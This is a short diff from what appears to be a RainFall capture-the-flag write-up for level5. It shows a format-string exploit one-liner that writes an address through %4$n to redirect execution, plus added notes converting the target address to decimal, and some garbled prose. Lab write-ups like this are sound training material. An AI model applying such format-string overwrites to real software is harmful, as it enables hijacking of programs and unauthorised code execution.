@@ -24,6 +24,9 @@ disas n
 level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")' > /tmp/out && (cat /tmp/out; cat) | ./level5 
 
 
+0x080484a4
+
+134513828
 in decimale of 0x080484a4 is : 134513828 + 4
 so we will arse the 
 
